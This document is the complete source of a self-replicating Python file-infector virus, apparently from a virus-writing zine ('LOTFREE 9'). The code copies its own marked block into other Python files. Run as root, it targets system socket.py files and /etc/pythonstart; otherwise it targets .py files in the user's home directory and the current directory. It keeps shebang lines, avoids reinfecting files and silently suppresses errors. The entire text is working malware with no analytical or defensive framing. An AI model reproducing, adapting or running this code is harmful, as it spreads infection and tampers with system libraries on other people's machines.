#inf3ct3d
# LOTFREE 9
try:
  import sys,os,glob
  vxfd = open(__file__)
  vx_ = vxfd.readlines()
  vx_ = vx_[vx_.index('#inf3ct3d\n') : vx_.index('#t3h3nd\n') + 1]
  vxfd.close()


  def infect(f):
    if not os.path.isfile(f) : return
    if not os.access(f,os.W_OK) : return
    v = open(f, "a+")
    m = v.readlines()
    if "#inf3ct3d\n" in m:
      v.close()
      return
    v.seek(0)
    v.truncate()
    if m[0].startswith("#!/"):
      v.write(m[0])
      m.pop(0)
    v.writelines(vx_)
    v.writelines(m)
    v.close()
    

  l = []
  if os.geteuid() == 0:
    # infect python files
    l += glob.glob("/usr/lib/python*/socket.py")
    l.append("/etc/pythonstart")
  else:
    #files in local dir
    if sys.platform != 'win32':
      l += glob.glob(os.path.expanduser('~') + "/*.py")
    l += glob.glob("*.py")
  for f in l: infect(f)
except ImportError:
  pass
except NameError:
  pass
except ValueError:
  pass
#t3h3nd
#do not touch this line
